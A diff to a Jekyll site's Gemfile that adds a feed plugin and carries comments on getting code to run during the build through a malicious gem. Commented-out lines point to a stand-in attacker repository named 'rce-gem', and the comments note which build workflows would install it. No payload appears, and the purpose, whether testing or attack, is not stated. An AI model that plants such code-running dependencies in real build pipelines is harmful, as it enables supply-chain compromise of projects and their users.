@@ -1,9 +1,9 @@
 source "https://rubygems.org"
 
-# Attempt to use a gem with malicious post_install hook
-# Note: This shouldn't run in the Pages build environment
 gem "github-pages", group: :jekyll_plugins
+gem "jekyll-feed"
 
-# Test: Can we include a custom gem that executes code?
-# gem "our-rce-gem", path: "/tmp/our-gem"  # Path gems don't work remotely
-# gem "our-rce-gem", git: "https://github.com/attacker/rce-gem"  # Git gems?
+# Can we add a custom gem that executes code?
+# In Actions workflow with "bundle exec jekyll build", this WOULD run
+# The jekyll-build-pages action ignores Gemfile (uses pre-installed gems)
+# But a custom workflow with "bundle exec jekyll build" would install this
